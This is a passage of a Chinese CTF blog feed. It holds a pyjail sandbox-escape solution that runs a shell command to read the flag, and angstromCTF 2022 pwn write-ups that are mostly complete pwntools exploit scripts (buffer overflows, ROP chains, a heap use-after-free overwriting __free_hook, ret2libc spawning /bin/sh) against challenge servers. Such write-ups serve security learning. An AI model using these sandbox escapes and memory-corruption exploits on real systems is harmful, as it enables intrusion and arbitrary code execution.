class="string">&#x27;BUILD_SET&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BUILD_CONST_KEY_MAP&#x27;</span>, <span class="string">&#x27;BUILD_STRING&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;LOAD_CONST&#x27;</span>,<span class="string">&#x27;RETURN_VALUE&#x27;</span>,<span class="string">&#x27;STORE_SUBSCR&#x27;</span>, <span class="string">&#x27;STORE_MAP&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;LIST_TO_TUPLE&#x27;</span>, <span class="string">&#x27;LIST_EXTEND&#x27;</span>, <span class="string">&#x27;SET_UPDATE&#x27;</span>, <span class="string">&#x27;DICT_UPDATE&#x27;</span>, <span class="string">&#x27;DICT_MERGE&#x27;</span>,</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">_expr_codes = _const_codes + [</span><br><span class="line">    <span class="string">&#x27;UNARY_POSITIVE&#x27;</span>,<span class="string">&#x27;UNARY_NEGATIVE&#x27;</span>,<span class="string">&#x27;UNARY_NOT&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;UNARY_INVERT&#x27;</span>,<span class="string">&#x27;BINARY_POWER&#x27;</span>,<span class="string">&#x27;BINARY_MULTIPLY&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BINARY_DIVIDE&#x27;</span>,<span class="string">&#x27;BINARY_FLOOR_DIVIDE&#x27;</span>,<span class="string">&#x27;BINARY_TRUE_DIVIDE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BINARY_MODULO&#x27;</span>,<span class="string">&#x27;BINARY_ADD&#x27;</span>,<span class="string">&#x27;BINARY_SUBTRACT&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BINARY_LSHIFT&#x27;</span>,<span class="string">&#x27;BINARY_RSHIFT&#x27;</span>,<span class="string">&#x27;BINARY_AND&#x27;</span>,<span class="string">&#x27;BINARY_XOR&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BINARY_OR&#x27;</span>,</span><br><span class="line">    ]</span><br></pre></td></tr></table></figure><p>但是看到源文件中，给我们patch了两个新的函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># The above only allows Turing-incomplete evaluation,</span></span><br><span class="line"><span class="comment"># so we decided to add our own ingenious additions:</span></span><br><span class="line">complete_codes = _expr_codes + [<span class="string">&#x27;MAKE_FUNCTION&#x27;</span>, <span class="string">&#x27;CALL_FUNCTION&#x27;</span>]</span><br></pre></td></tr></table></figure><p>可以想到用lambda表达式。我们尝试创建一个函数，是可以的</p><p><img src="/2022/05/08/pyjail/Users\15302\AppData\Roaming\Typora\typora-user-images\image-20220509112445901.png" alt="image-20220509112445901"></p><p>但是却并不能将他赋值。这是哪里出错了呢？</p><p><img src="/2022/05/08/pyjail/Users\15302\AppData\Roaming\Typora\typora-user-images\image-20220509112522650.png" alt="image-20220509112522650"></p><p>可以直接对上述表达式外部加括号即可。</p><p><img src="/2022/05/08/pyjail/Users\15302\AppData\Roaming\Typora\typora-user-images\image-20220509112622269.png" alt="image-20220509112622269"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>(<span class="keyword">lambda</span> x:<span class="built_in">exec</span>(os.system(<span class="string">&quot;cat flag.txt&quot;</span>)))(<span class="number">1</span>)</span><br><span class="line">sdctf&#123;u5ing_l4mbDA5_t0_smUgg1e_m4licious_BYTECODEz&#125;</span><br></pre></td></tr></table></figure><p>后面的(1)表示参数，这里参数就是x但是我们没用过，所以随便填一个就可以了。</p><blockquote><p>如何测试一个表达式是否被允许</p><p>可以手动看compile后的opcode有哪些</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>c = <span class="built_in">compile</span>(<span class="string">&quot;[1 + 2, (1,2)]&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;eval&quot;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>_get_opcodes(c)</span><br><span class="line">[<span class="number">100</span>, <span class="number">100</span>, <span class="number">103</span>, <span class="number">83</span>]</span><br></pre></td></tr></table></figure></blockquote>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bash_jail </tag>
            
            <tag> pyjail </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>angstormCTF2022_pwn</title>
      <link href="/2022/05/05/angstormCTF2022-pwn/"/>
      <url>/2022/05/05/angstormCTF2022-pwn/</url>
      
        <content type="html"><![CDATA[<p>这个比赛并不难，最后一个pwn的wp现在还没有。</p><span id="more"></span><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="whatsmyname"><a href="#whatsmyname" class="headerlink" title="whatsmyname"></a>whatsmyname</h2><p>白给，gdb和ida都没用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;challs.actf.co&quot;</span>, <span class="number">31223</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;Hi! What&#x27;s your name?&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;a&quot;</span>*<span class="number">48</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;a&quot;</span>*<span class="number">48</span>)</span><br><span class="line">randomnum = io.recvuntil(<span class="string">b&quot;!&quot;</span>, drop=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="built_in">str</span>(randomnum))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;Guess my name and you&#x27;ll get a flag!&quot;</span>, randomnum)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="wah"><a href="#wah" class="headerlink" title="wah"></a>wah</h2><p>（白给，gdb和ida都没用）*2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;challs.actf.co&quot;</span>, <span class="number">31224</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;Cry:&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">40</span>+p64(<span class="number">0x401236</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="really-obnoxious-problem"><a href="#really-obnoxious-problem" class="headerlink" title="really obnoxious problem"></a>really obnoxious problem</h2><p>白给</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;challs.actf.co&#x27;</span>, <span class="number">31225</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./really_obnoxious_problem&#x27;)</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Name: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;bobby&#x27;</span>)</span><br><span class="line"></span><br><span class="line">poprdi = <span class="number">0x00000000004013f3</span></span><br><span class="line">poprsir15 = <span class="number">0x00000000004013f1</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Address: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;a&#x27;</span> * <span class="number">72</span> + p64(poprdi) + p64(<span class="number">0x1337</span>) + p64(poprsir15) +</span><br><span class="line">            p64(<span class="number">0x4040a0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x0401256</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="dream"><a href="#dream" class="headerlink" title="dream"></a>dream</h2><p>这个不用做了，本地出了，远程服务器给的时间太少，已经私聊了，人家在睡觉<br>已出<br><code>actf&#123;hav3_you_4ny_dreams_y0u&#39;d_like_to_s3ll?_cb72f5211336&#125;</code></p><p>主要就是一个sell的时候的UAF，但是限制了堆块大小，并且只能新建5个。这里把control chunk直接malloc出来从而让上述限制都失效了。<br>泄露libc是把一个堆块size位置改掉，然后释放掉(注意布置后面的堆块来通过unsortedbin的检查)之后show出libc。<br>然后任意地址写改free_hook。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename=<span class="string">&quot;./dreams&quot;</span></span><br><span class="line">libc_name=<span class="string">&quot;libc.so.6&quot;</span></span><br><span class="line"><span class="comment"># io = process(filename)</span></span><br><span class="line">io = remote(<span class="string">&#x27;challs.actf.co&#x27;</span>, <span class="number">31227</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(filename)</span><br><span class="line">libc=ELF(libc_name)</span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split&#x27;</span>,<span class="string">&#x27;-hp&#x27;</span>,<span class="string">&#x27;60&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_sleep</span>(<span class="params">index,date,about</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;dream?&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">    io.send(date)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">    io.send(about)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sell</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">visit</span>(<span class="params">index,date</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;trouble? &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;that &#x27;</span>)</span><br><span class="line">    info = io.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>) <span class="comment"># return key addr</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;date: &#x27;</span>)</span><br><span class="line">    io.send(date)</span><br><span class="line">    <span class="keyword">return</span> info</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    cmd = <span class="string">&quot;&quot;</span></span><br><span class="line">    cmd +=<span class="string">&quot;b *0x401549\n&quot;</span> <span class="comment"># call visit</span></span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line">    visit(<span class="number">0</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arb_write</span>(<span class="params">dst,src</span>):</span><br><span class="line">    <span class="comment"># arb write 8 bytes</span></span><br><span class="line">    visit(<span class="number">4</span>,p64(dst))</span><br><span class="line">    visit(<span class="number">0</span>,p64(src))</span><br><span class="line"></span><br><span class="line">my_sleep(<span class="number">0</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&quot;aa&quot;</span>) <span class="comment">#0</span></span><br><span class="line">my_sleep(<span class="number">1</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&quot;bb&quot;</span>) <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">sell(<span class="number">1</span>)</span><br><span class="line">sell(<span class="number">0</span>)</span><br><span class="line">heap_info = u64(visit(<span class="number">0</span>,<span class="string">&#x27;1&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;heap_info: &quot;</span> + <span class="built_in">hex</span>(heap_info))</span><br><span class="line">heap_base = heap_info-<span class="number">0x10</span></span><br><span class="line">success(<span class="string">&quot;heap_addr: &quot;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># change one addr to control block</span></span><br><span class="line">visit(<span class="number">0</span>,p64(heap_base+<span class="number">0x2a0</span>))</span><br><span class="line">my_sleep(<span class="number">3</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&quot;aa&quot;</span>) <span class="comment"># same with 0</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;b *0x4013A4&quot;)</span></span><br><span class="line">my_sleep(<span class="number">4</span>,p64(heap_base+<span class="number">0x0012e0</span>),p64(heap_base+<span class="number">0x001310</span>)) <span class="comment"># 4 can control whole</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">arb_write(heap_base+<span class="number">0x0012e8</span>,<span class="number">0</span>) <span class="comment"># key-&gt;0</span></span><br><span class="line">arb_write(heap_base+<span class="number">0x0012e8</span>-<span class="number">0x10</span>,<span class="number">0xa1</span>) <span class="comment"># size-&gt;0xa0</span></span><br><span class="line">arb_write(heap_base+<span class="number">0x001378</span>,<span class="number">0x21</span>)</span><br><span class="line">arb_write(heap_base+<span class="number">0x001398</span>,<span class="number">0x21</span>)</span><br><span class="line">visit(<span class="number">4</span>,p64(heap_base+<span class="number">0x0012e0</span>)) <span class="comment"># fd back to pointer</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">    sell(<span class="number">0</span>)</span><br><span class="line">    arb_write(heap_base+<span class="number">0x0012e8</span>,<span class="number">0</span>)</span><br><span class="line">    visit(<span class="number">4</span>,p64(heap_base+<span class="number">0x0012e0</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"><span class="comment"># visit(0)</span></span><br><span class="line">visit(<span class="number">4</span>,p64(heap_base+<span class="number">0x0012d8</span>))</span><br><span class="line">libc_info = u64(visit(<span class="number">0</span>,p64(<span class="number">0</span>)).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;libc_info: &quot;</span> + <span class="built_in">hex</span>(libc_info))</span><br><span class="line">libc_base = libc_info - <span class="number">0x1ecbe0</span></span><br><span class="line">success(<span class="string">&quot;libc_base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># arb_write(heap_base+0x001310,&#x27;/bin/sh&#x27;)</span></span><br><span class="line">visit(<span class="number">4</span>,p64(heap_base+<span class="number">0x001310</span>))</span><br><span class="line">visit(<span class="number">0</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">arb_write(heap_base+<span class="number">0x001318</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">arb_write(free_hook,system)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;b *0x4014FF&quot;)</span></span><br><span class="line">sell(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="whereami"><a href="#whereami" class="headerlink" title="whereami"></a>whereami</h2><p><code>actf&#123;i&#39;d_be_saf3_and_w4rm_if_1_wa5_in_la_5ca5e33ff06f&#125;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename=<span class="string">&quot;./whereami&quot;</span></span><br><span class="line">libc_name=<span class="string">&quot;libc.so.6&quot;</span></span><br><span class="line"><span class="comment"># io = process(filename)</span></span><br><span class="line">io = remote(<span class="string">&#x27;challs.actf.co&#x27;</span>, <span class="number">31222</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(filename)</span><br><span class="line">libc=ELF(libc_name)</span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split&#x27;</span>,<span class="string">&#x27;-hp&#x27;</span>,<span class="string">&#x27;60&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">csu1 = <span class="number">0x4012FA</span></span><br><span class="line">csu2 = <span class="number">0x4012E0</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000401303</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span></span><br><span class="line">payload +=p64(pop_rdi)</span><br><span class="line">payload+=p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload +=p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(csu1)</span><br><span class="line">payload +=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">1</span>)+p64(<span class="number">0x40406C</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(elf.got[<span class="string">&#x27;gets&#x27;</span>])</span><br><span class="line">payload +=p64(csu2)</span><br><span class="line">payload +=p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload+=p64(<span class="number">0x401110</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;you? &#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;b *0x401297&quot;)</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;b *0x401211&quot;)</span></span><br><span class="line">puts_info = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;puts_info: &quot;</span> + <span class="built_in">hex</span>(puts_info))</span><br><span class="line">libc_base = puts_info-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="built_in">input</span>(<span class="string">&#x27;send&#x27;</span>)</span><br><span class="line">io.sendline(p32(<span class="number">0x0</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&quot;a&quot;</span>*<span class="number">0x48</span></span><br><span class="line">payload2 +=p64(<span class="number">0x000000000040101a</span>) <span class="comment"># ret</span></span><br><span class="line">payload2 +=p64(pop_rdi)</span><br><span class="line">payload2 +=p64(libc_base+libc.search(<span class="string">b&quot;/bin/sh&quot;</span>).__next__())</span><br><span class="line">payload2+=p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>]+libc_base)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;you? &#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;b *0x401297&quot;)</span></span><br><span class="line"><span class="built_in">input</span>(<span class="string">&#x27;send2&#x27;</span>)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="parity"><a href="#parity" class="headerlink" title="parity"></a>parity</h2><p><code>actf&#123;f3els_like_wa1king_down_4_landsl1de_6d28d72fd7db&#125;</code><br>无语题目，要我写奇偶交替的shellcode，把大伙都整笑了。<br>找gadget的方法我是用下面的脚本，就是暴力获取所有奇数偶数奇数的全排列指令，然后反汇编。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">oushu = []</span><br><span class="line">jishu = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">0xff</span>):</span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        oushu.append(i)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        jishu.append(i)</span><br><span class="line"></span><br><span class="line">tmp = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> oushu:</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> jishu:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> oushu:</span><br><span class="line">            tmp +=<span class="built_in">chr</span>(a)+<span class="built_in">chr</span>(b)+<span class="built_in">chr</span>(c)</span><br><span class="line"></span><br><span class="line">tmp2 = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> jishu:</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> oushu:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> jishu:</span><br><span class="line">            tmp2+=<span class="built_in">chr</span>(a)+<span class="built_in">chr</span>(b)+<span class="built_in">chr</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span> (<span class="string">&quot;bin1&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f1:</span><br><span class="line">    f1.write(tmp)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;bin2&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f2:</span><br><span class="line">    f2.write(tmp2)</span><br></pre></td></tr></table></figure><p>之后用下面的命令<br><code>disasm -c amd64 &lt; bin &gt; all_gadget</code><br>找到的gadget如下所示。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> 0:       00 01                   add    BYTE PTR [rcx], al</span><br><span class="line"> 2:       00 00                   add    BYTE PTR [rax], al</span><br><span class="line"> 4:       01 02                   add    DWORD PTR [rdx], eax</span><br><span class="line"> 6:       00 01                   add    BYTE PTR [rcx], al</span><br><span class="line"> 8:       04 00                   add    al, 0x0</span><br><span class="line"> a:       01 06                   add    DWORD PTR [rsi], eax</span><br><span class="line"> c:       00 01                   add    BYTE PTR [rcx], al</span><br><span class="line"> e:       08 00                   or     BYTE PTR [rax], al</span><br><span class="line">10:       01 0a                   add    DWORD PTR [rdx], ecx</span><br><span class="line">12:       00 01                   add    BYTE PTR [rcx], al</span><br><span class="line">14:       0c 00                   or     al, 0x0</span><br><span class="line">16:       01 0e                   add    DWORD PTR [rsi], ecx</span><br><span class="line">18:       00 01                   add    BYTE PTR [rcx], al</span><br><span class="line">1a:       10 00                   adc    BYTE PTR [rax], al</span><br><span 